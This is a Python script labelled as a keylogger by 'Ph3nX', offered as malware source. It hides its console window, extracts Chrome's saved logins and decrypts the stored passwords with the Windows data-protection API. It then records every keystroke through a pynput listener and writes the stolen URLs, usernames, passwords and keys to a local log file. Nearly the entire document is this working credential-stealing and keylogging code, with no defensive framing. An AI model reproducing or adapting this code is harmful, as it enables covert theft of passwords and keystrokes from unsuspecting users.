   ######################  
#### Keylogger by Ph3nX.####
   ######################


def chrome():
    import os
    import sqlite3
    import win32crypt
    import sys

    try:
        path = sys.argv[1]
    except IndexError:
        for w in os.walk(os.getenv('USERPROFILE')):
            if 'Chrome' in w[1]:
                path = str(w[0]) + r'\Chrome\User Data\Default\Login Data'

    try:
        print('[+] Opening ' + path)
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
    except Exception as e:
        print('[-] %s' % (e))
        sys.exit(1)

    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except Exception as e:
        print('[-] %s' % (e))
        sys.exit(1)

    data = cursor.fetchall()

    if len(data) > 0:
        for result in data:
            # Decrypt the Password
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except Exception as e:
                print('[-] %s' % (e))
                pass
            if password:
                print('''[+] URL: %s
        Username: %s 
        Password: %s''' %(result[0], result[1], password))
            f=open("log.txt", 'a')
            f.write("----------PASSWORDS----------")
            f.write('''[+] URL: %s
            Username: %s 
            Password: %s''' %(result[0], result[1], password))
            f.write("\n")
    else:
        print('[-] Cannot display results')
        sys.exit(0)

    f.write("----------PASSWORDS END----------")
    f.close()
import pynput
import win32api
import os
from pynput.keyboard import Key,Listener

count = 0
keys = []

os.system('echo "-------StartinG-------">log.txt')
with open("log.txt", "a") as m:
    m.write("\n")
    m.close()

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

Hide()
def on_press(key):
    global keys, count

    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
try :
    chrome()
except:
    f=open("log.txt", "a")
    f.write("Chrome Opened, cant get passwords")
    f.close()
def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("Key"):
                f.write(k)


def on_release(key):
    global exit
    if key == Key.esc:
        exit += 1
        if exit == 5 :
            return False

exit = 0
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()